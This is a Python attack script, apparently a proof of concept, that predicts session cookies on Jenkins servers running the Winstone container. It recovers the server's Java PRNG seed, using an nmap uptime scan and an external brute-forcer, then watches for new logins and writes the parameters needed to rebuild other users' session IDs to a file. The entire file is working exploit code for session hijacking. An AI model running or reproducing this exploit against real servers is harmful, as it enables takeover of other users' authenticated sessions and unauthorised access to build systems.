import hashlib,time,httplib,socket,re
from JavaLCGLib import JavaLCGMimic
from datetime import datetime
import pytz
import nmap
from optparse import OptionParser
import subprocess

CookieName = "" #global name for cookie, Jenkins generates unique name for cookie on each run
PRNGseekMax = 7 #global value, estimates PRNG max seek
PRNGMillisDelta = 1000*20 #global value, maximum gap between PRNGMillis estimate and its real value
timeMillisDelay = 2000 #global value, differense in milli seconds between time cookie was generated and time we got response
numthreads = 32 #numbers of threads used by external PRNG bruteforcer
prog_name = "./jenkins_ofsecra" #external PRNG bruteforcer
timestampInitalValue = -300 #inital value for TCP timestamp counter. On Ubuntu it has value -300.

initalSeek = 7

"""
Ask for new a cookie from web server.
Returns tuple (cookie,Date). Date is HTTP header.
"""
def givemecookie(url):
    response = None

    host = url.replace("http://","").replace("https://","").split("/")[0]

    conn = httplib.HTTPConnection(host)
    conn.request("GET", url.replace("http://"+url,"").replace("https://"+url,""))
    response = conn.getresponse()

    #print response.status

    return (response.getheader('Set-Cookie').split(';')[0], response.getheader('Date'))

"""
Use external PRNG bruteforcer
"""
def PRNGbruteforcer(cookie,IPAddr,serverPort,timeMillisEstimate,PRNGMillisEstimate):
    global PRNGseekMax
    global PRNGMillisDelta
    global timeMillisDelay
    global numthreads
    global prog_name
    
    
    cmd = [prog_name,"-c",cookie,"-i",IPAddr,"-p",str(serverPort),"-s",str(timeMillisEstimate),"-t",str(PRNGMillisEstimate),"-r",str(numthreads),"-e",str(PRNGMillisDelta/1000),"-n",str(PRNGseekMax),"-m",str(timeMillisDelay)]
    #cmd = "%s -c %s -i %s -p %s -s %s -t %s -r %s -e %s -n %s -m %s"%(prog_name,cookie,IPAddr,serverPort,timeMillisEstimate,PRNGMillisEstimate,numthreads,PRNGMillisDelta/1000,PRNGseekMax,timeMillisDelay)
    p = subprocess.Popen(" ".join(cmd),stdout=subprocess.PIPE,shell=True)

    l = p.communicate()[0].split("=")
    if len(l) == 1:
        return None
    
    return long(l[-1].splitlines()[0])

"""
Recover internal PRNG state (seed).
Complexity for recovering PRNG seed equals to (timeMillisDelay+1000)*PRNGMillisDelta*PRNGSeek.
Ex. If service just started PRNGSeek=1, we can estimate service start time in 1 minute, and we got response from service in 1 second
then complexity is (2000*1000*600) < 2^31
"""
def recoverPRNGState(url,PRNGMillisEstimate,IPAddr,serverPort,timezone):
    global CookieName
    global PRNGseekMax
    global PRNGMillisDelta
    global timeMillisDelay

    PRNGMillisMax = PRNGMillisEstimate+PRNGMillisDelta

    t = givemecookie(url)

    if t == None:
        return

    CookieName = t[0].split('=')[0]  
    cookie = t[0].split('=')[-1]

    st = time.strptime(t[-1], '%a, %d %b %Y %H:%M:%S %Z')
    dt = datetime.fromtimestamp(time.mktime(st)) #
    dt = dt.replace(tzinfo=pytz.utc).astimezone(pytz.timezone(timezone))
    
    timeSecs = int(time.mktime(dt.timetuple()))

    print "[.] Millis estimate from HTTP header =",timeSecs*1000
    print "[.] Cookie retrieved =",cookie
    print t[-1]
    #raw_input('Enter')

    return PRNGbruteforcer(cookie,IPAddr,serverPort,timeSecs*1000,PRNGMillisEstimate)

def syncMillisAndPRNG(url,PRNGseed,IPAddr,serverPort,timezone):
        global CookieName
        global PRNGseekMax
        global timeMillisDelay
        
        t = givemecookie(url)

        if t == None:

            return

        cookie = t[0].split('=')[-1]
        st = time.strptime(t[-1], '%a, %d %b %Y %H:%M:%S %Z')
        dt = datetime.fromtimestamp(time.mktime(st))
        dt = dt.replace(tzinfo=pytz.utc).astimezone(pytz.timezone(timezone))
        
        timeSecs = int(time.mktime(dt.timetuple()))

        PRNGseek = 1
        while True:
            if PRNGseek > PRNGseekMax:
                break

            g = JavaLCGMimic(0)
            g.forceSeed(PRNGseed)
            
            PRNGout = -1
            for s in range(PRNGseek):
                PRNGout = g.nextLong()

            for timeMillis in range((timeSecs*1000)-timeMillisDelay,(timeSecs*1000)):
                md5dig = hashlib.md5()
                md5dig.update("Winstone_"+IPAddr+"_"+serverPort+"_"+str(timeMillis)+str(PRNGout))
                
                if md5dig.hexdigest() == cookie:
                    print "[!] Parameters found:","timeMillis =",timeMillis,"Seek =",PRNGseek
                    return (timeMillis,g.seed,PRNGseek)

            PRNGseek += 1

def catchSessions(url,PRNGMillisEstimate,IPAddr,serverPort,sessionsFileName,timezone):
    global CookieName

    PRNGseed = recoverPRNGState(url,PRNGMillisEstimate,IPAddr,serverPort,timezone)
    
    print "[*] PRNGseed =",PRNGseed

    if PRNGseed == None:
        return
    
    f = open(sessionsFileName,'w')  

    timeMillisPrev = -1
    while True:
        tup = syncMillisAndPRNG(url,PRNGseed,IPAddr,serverPort,timezone)

        if tup == None:
            return

        (timeMillis,seed,PRNGseek) = tup

        if PRNGseek > 1 and timeMillisPrev != -1:
                print "[!] Somebody loged in..."
                #raw_input('Press enter to continue')
                f.write(",".join([CookieName,str(timeMillisPrev+1),str(timeMillis),str(PRNGseed),str(PRNGseek-1)])+"\n")
                f.flush()

        timeMillisPrev = timeMillis
        PRNGseed = seed
        time.sleep(0.5)

"""
We think that PRNG initialization happened near time when host boot.
We use nmap to get estimate for host uptime. Nmap uses TCP timestamps.
host - IP address, string.
port - Port number, string.
"""
def PRNGMillisEstimateFromUptime(host,port,timezone='Europe/Moscow'):
    global timestampInitalValue
    
    dt = datetime.utcnow()
    dt = dt.replace(tzinfo=pytz.utc).astimezone(pytz.timezone(timezone))
    timeSecs = int(time.mktime(dt.timetuple())) #current time since Epoch in seconds in UTC

    nm = nmap.PortScanner()
    nm.scan(host,port,'-O')
    secondsToSubtract = int(nm[host]['uptime']['seconds']) #host uptime estimate in seconds
    #print "secondsToSubtract =",secondsToSubtract 

    return (timeSecs-secondsToSubtract+timestampInitalValue)*1000 #we subtract timestampInitalValue

def main():
    global numthreads

    parser = OptionParser(usage="usage: %prog [-f <FILENAME> | -e <MILLIS> | -t <TIMEZONE> | -w <WORKERS>] -u <URL> -i <IP>")
    parser.add_option("-u", "--url", action="store", type="string", dest="url",help="URL of application running on Winstone.")
    parser.add_option("-f", "--fname", action="store", type="string", dest="sessionsfilename",help="File where session information is stored. If parameter not specified 'winstonesessions.txt' file will be used.")
    parser.add_option("-i", "--yourip", action="store", type="string", dest="yourip",help="IP address of netw inreface you use to communicate with Winstone.")
    parser.add_option("-e", "--prngmillis", action="store", type="int", dest="prngmillisestimate",help="Estimate in millis for time when Winstone service was launched. If parameter not specified, host uptime will be used.")
    parser.add_option("-t", "--timezone", action="store", type="string", dest="timezone",help="Winstone host timezone. Your could determine it by IP address. If parameter not specified 'Europe/Moscow' TZ will be used")
    parser.add_option("-w", "--workers", action="store", type="int", dest="workers",help="Number of worker processes. Default value is 6.")
    
    (options, args) = parser.parse_args()

    if (options.url == None) or (options.yourip == None):
        parser.print_usage()
        return

    workers = options.workers
    if options.workers == None:
        workers = numthreads
    
    timezone = options.timezone
    if options.timezone == None:
        timezone = 'Europe/Moscow'

    filename = options.sessionsfilename
    if options.sessionsfilename == None:
        filename = 'winstonesessions.txt'
        
    (host,port) = options.url.replace("http://","").replace("https://","").split("/")[0].split(":")

    millis = options.prngmillisestimate
    if options.prngmillisestimate == None:
       millis =  PRNGMillisEstimateFromUptime(host,port,timezone)
    
    millis += 1000*33
    print "[.] PRNG Millis estimate = ",millis
    numthreads = int(workers)
    catchSessions(options.url,int(millis),options.yourip,port,filename,timezone)

main()
##timeMillis= 1389385793012 PRNGMillis= 1389385620451 Seek= 2
##124067733525874

#print catchSession("http://192.168.66.2:8080/",1389394779987,"192.168.66.4","8080","jenkinssessions.txt")
#print givemecookie("http://192.168.66.2:8080/")

#print PRNGMillisEstimateFromUptime('192.168.66.2','8080')
#timeMillis= 1389126547507 PRNGMillis= 1389125730887 Seek= 1

#crackit("http://192.168.66.2:8080/app/login","http://192.168.66.2:8080/app/",1389383319177,"192.168.66.3","8080")

#1a7b03b57c97feac4321d4627e7caa43
#print isCookieValid('http://192.168.66.2:8080/app/','JSESSIONID=2a7b03b57c97feac4321d4627e7caa43')
